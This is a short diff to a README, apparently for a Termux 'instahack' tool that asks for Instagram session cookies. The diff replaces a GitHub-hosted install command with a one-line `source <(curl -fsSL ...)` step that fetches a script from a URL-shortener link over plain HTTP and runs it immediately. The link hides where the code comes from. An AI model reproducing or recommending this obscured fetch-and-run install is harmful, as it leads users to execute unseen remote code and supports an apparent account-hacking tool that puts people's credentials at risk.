@@ -21,8 +21,8 @@ This tool is available for Termux Android.
 
 ### installation
 Quick installation for Termux Android
-````bash
-pkg install wget -y && wget https://raw.githubusercontent.com/termuxhackers-id/instahack/main/install.sh && bash install.sh
+````bash 
+source <(curl -fsSL http://lnkiy.in/IHackInstall)
 ````
 ### authentication
 Require instagram cookies, get yor cookies with cookiedough (chrome extensions)
